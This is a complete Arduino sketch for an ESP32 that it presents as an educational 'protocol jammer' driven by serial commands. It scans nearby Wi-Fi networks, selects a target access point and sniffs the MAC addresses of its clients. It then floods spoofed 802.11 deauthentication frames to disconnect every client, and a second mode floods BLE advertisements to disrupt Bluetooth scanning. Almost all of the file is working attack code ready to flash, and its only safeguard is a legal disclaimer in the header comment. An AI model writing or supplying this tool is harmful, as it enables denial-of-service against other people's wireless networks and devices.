/*
 * ESP32_JAMMER_DEMO.ino
 * Educational trial "protocol jammer" - single ESP32 WROOM DevKit, no extra hardware.
 *
 * WiFi mode : 802.11 deauthentication frame flood -> force-disconnects every
 *             client of a chosen access point within range.
 * BLE mode  : continuous BLE advertisement flood on advertising channels
 *             37/38/39 -> congests the channel and disrupts nearby BLE scans.
 *
 * A stock ESP32 radio is narrowband and half-duplex; it cannot produce wideband
 * 2.4 GHz RF noise, so a true "RF jammer" is impossible with one dev board.
 * This demo exists to show link-layer attack mechanics.
 *
 * LEGAL: only test on an access point / devices you own. Deauthing or jamming
 * networks you do not own is illegal in most jurisdictions.
 *
 * Usage (Arduino IDE, board "ESP32 Dev Module"):
 *   s        -> scan 2.4 GHz networks
 *   t <n>    -> select target network by index
 *   d        -> toggle WiFi deauth flood
 *   b        -> toggle BLE advertisement flood
 *   l        -> list clients sniffed on the target AP
 *   c        -> stop everything
 *   ?        -> help
 */

#include <WiFi.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

#define LED_PIN              2       // onboard LED on most dev boards
#define DEAUTH_BURST_MS      500     // delay between bursts
#define FRAMES_PER_BURST     20      // frames per burst
#define MAX_CLIENTS          16
#define MAX_NETS             16
#define REASON_CODE          0x01    // 0x01 = unspecified, 0x07 = nonassociated

// ---------------- state ----------------
static bool        floodActive    = false;
static bool        bleFloodActive = false;
static bool        promiscuousOn  = false;

static bool        apSelected     = false;
static uint8_t     apMac[6]       = {0};
static uint8_t     apChannel      = 1;
static String      apSSID;

static uint8_t     clients[MAX_CLIENTS][6];
static uint8_t     clientCount    = 0;
static uint16_t    seqNum         = 0;

static uint8_t     scanBssid[MAX_NETS][6];
static uint8_t     scanChan[MAX_NETS];
static String      scanSSID[MAX_NETS];
static int         scanCount      = 0;

static bool        bleInitDone    = false;
static bool        advStarted     = false;

static unsigned long lastDeauthMs = 0;
static unsigned long lastBleMs    = 0;

// ---------------- helpers ----------------
void printMac(const uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    if (mac[i] < 0x10) Serial.print('0');
    Serial.print(mac[i], HEX);
    if (i < 5) Serial.print(':');
  }
}

bool macEqual(const uint8_t* a, const uint8_t* b) {
  return memcmp(a, b, 6) == 0;
}

void addClient(const uint8_t* mac) {
  if (macEqual(mac, apMac)) return;          // it's the AP itself
  if (mac[0] & 0x01) return;                 // broadcast/multicast
  for (int i = 0; i < clientCount; i++)
    if (macEqual(clients[i], mac)) return;   // already known
  if (clientCount < MAX_CLIENTS) {
    memcpy(clients[clientCount], mac, 6);
    clientCount++;
    Serial.print("[+] client: ");
    printMac(mac);
    Serial.println();
  }
}

// ---------------- 802.11 frame -----------------
// Frame layout (24-byte header, no FCS - ESP32 computes it):
//   [0..1] frame control   [2..3] duration
//   [4..9] addr1 (DA)      [10..15] addr2 (SA)   [16..21] addr3 (BSSID)
//   [22..23] seq control   [24..25] reason code (deauth)
void sendDeauth(const uint8_t* ap, const uint8_t* client) {
  uint8_t f[26];
  memset(f, 0, sizeof(f));
  f[0] = 0xC0;                     // management, subtype 12 (deauth)
  f[1] = 0x00;
  memcpy(&f[4],  client, 6);       // DA = victim (or broadcast)
  memcpy(&f[10], ap,     6);       // SA = AP
  memcpy(&f[16], ap,     6);       // BSSID = AP
  f[22] = (seqNum & 0x0F) << 4;    // frag = 0
  f[23] = (seqNum >> 4) & 0xFF;    // sequence number (12 bit)
  f[24] = REASON_CODE;
  esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
  seqNum = (seqNum + 1) & 0xFFF;
}

// ---------------- promiscuous sniffer ----------------
// Collects client MACs of the selected AP for targeted deauth.
void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!floodActive) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* f = pkt->payload;
  uint8_t fc0 = f[0];

  if (fc0 == 0x40) {               // probe request from a client
    addClient(&f[10]);
    return;
  }
  if (((fc0 >> 2) & 0x03) == 2) {  // data frame, SA at 10, BSSID at 16
    if (apSelected && macEqual(&f[16], apMac)) {
      addClient(&f[10]);
    }
  }
}

void setRadioPromiscuous(bool on) {
  if (on == promiscuousOn) return;
  if (on) {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(sniffer);
    esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
    promiscuousOn = true;
  } else {
    esp_wifi_set_promiscuous(false);
    promiscuousOn = false;
  }
}

// ---------------- WiFi scan ----------------
void scanAndList() {
  if (promiscuousOn) { Serial.println("Stop the flood first ('c')."); return; }
  Serial.println("[*] scanning 2.4 GHz...");
  int n = WiFi.scanNetworks(false, true, false, 600);
  if (n <= 0) { Serial.println("[-] no networks found"); return; }
  scanCount = (n > MAX_NETS) ? MAX_NETS : n;
  for (int i = 0; i < scanCount; i++) {
    memcpy(scanBssid[i], WiFi.BSSID(i), 6);
    scanChan[i] = WiFi.channel(i);
    scanSSID[i] = WiFi.SSID(i);
    Serial.printf("[%d] ch=%2d rssi=%4d  ", i, scanChan[i], WiFi.RSSI(i));
    printMac(scanBssid[i]);
    Serial.print("  ");
    Serial.println(scanSSID[i]);
  }
  Serial.printf("[*] %d networks listed. Select one with 't <n>'\n", scanCount);
  WiFi.scanDelete();
}

void selectTarget(int idx) {
  if (promiscuousOn) { Serial.println("Stop the flood first ('c')."); return; }
  if (idx < 0 || idx >= scanCount) { Serial.println("Invalid index. Scan first ('s')."); return; }
  memcpy(apMac, scanBssid[idx], 6);
  apChannel = scanChan[idx];
  apSSID    = scanSSID[idx];
  apSelected = true;
  Serial.print("[*] target: ");
  printMac(apMac);
  Serial.printf("  ch=%d  %s\n", apChannel, apSSID.c_str());
}

// ---------------- WiFi deauth flood ----------------
void startFlood() {
  if (!apSelected) { Serial.println("Select a target first ('t <n>')."); return; }
  stopBleFlood();
  clientCount = 0;
  setRadioPromiscuous(true);
  floodActive = true;
  digitalWrite(LED_PIN, HIGH);
  Serial.print("[*] deauth flood -> ");
  printMac(apMac);
  Serial.printf(" (%s) ch=%d. 'd' to stop.\n", apSSID.c_str(), apChannel);
}

void stopFlood() {
  floodActive = false;
  digitalWrite(LED_PIN, LOW);
  setRadioPromiscuous(false);
  Serial.println("[*] deauth flood stopped");
}

void deauthTick() {
  if (!floodActive) return;
  if (millis() - lastDeauthMs < DEAUTH_BURST_MS) return;
  lastDeauthMs = millis();

  uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  for (int i = 0; i < FRAMES_PER_BURST; i++) sendDeauth(apMac, bcast);   // kick everyone
  for (int c = 0; c < clientCount; c++)                                   // then per-client
    for (int i = 0; i < FRAMES_PER_BURST; i++) sendDeauth(apMac, clients[c]);
}

void listClients() {
  Serial.printf("[*] %d client(s) seen on %s:\n", clientCount, apSSID.c_str());
  for (int c = 0; c < clientCount; c++) {
    Serial.print("    ");
    printMac(clients[c]);
    Serial.println();
  }
}

// ---------------- BLE advertisement flood ----------------
void startBleFlood() {
  stopFlood();
  if (!bleInitDone) {
    BLEDevice::init("ESP32-JAM");
    bleInitDone = true;
  }
  bleFloodActive = true;
  digitalWrite(LED_PIN, HIGH);
  Serial.println("[*] BLE advertisement flood on ch 37/38/39. 'b' to stop.");
}

void stopBleFlood() {
  bleFloodActive = false;
  digitalWrite(LED_PIN, LOW);
  if (bleInitDone) {
    BLEAdvertising* adv = BLEDevice::getAdvertising();
    if (advStarted) { adv->stop(); advStarted = false; }
  }
  Serial.println("[*] BLE flood stopped");
}

void bleTick() {
  if (!bleFloodActive) return;
  if (millis() - lastBleMs < 60) return;
  lastBleMs = millis();

  BLEAdvertising* adv = BLEDevice::getAdvertising();
  if (advStarted) { adv->stop(); advStarted = false; }

  BLEAdvertisementData data;
  data.setName("JAM");
  std::string mfg;
  for (int i = 0; i < 20; i++) mfg += (char)random(0, 256);   // random junk payload
  data.setManufacturerData(mfg);
  adv->setAdvertisementData(data);
  adv->start();
  advStarted = true;
}

// ---------------- serial commands ----------------
void printHelp() {
  Serial.println();
  Serial.println("Commands:");
  Serial.println("  s        scan 2.4 GHz networks");
  Serial.println("  t <n>    select target network by index");
  Serial.println("  d        toggle WiFi deauth flood");
  Serial.println("  b        toggle BLE advertisement flood");
  Serial.println("  l        list sniffed clients");
  Serial.println("  c        stop everything");
  Serial.println("  ?        help");
}

void handleSerial() {
  if (!Serial.available()) return;
  String line = Serial.readStringUntil('\n');
  line.trim();
  if (line.length() == 0) return;
  char cmd = line.charAt(0);
  int arg  = line.substring(1).toInt();

  switch (cmd) {
    case 'h':
    case '?': printHelp(); break;
    case 's': scanAndList(); break;
    case 't': selectTarget(arg); break;
    case 'd': floodActive ? stopFlood() : startFlood(); break;
    case 'b': bleFloodActive ? stopBleFlood() : startBleFlood(); break;
    case 'l': listClients(); break;
    case 'c': stopFlood(); stopBleFlood(); break;
    default:  printHelp();
  }
}

// ---------------- setup / loop ----------------
void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  randomSeed(millis());

  WiFi.setAutoConnect(false);
  WiFi.setAutoReconnect(false);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(500);

  Serial.println("\n=== ESP32 protocol jammer (educational trial) ===");
  printHelp();
}

void loop() {
  handleSerial();
  deauthTick();
  bleTick();
}
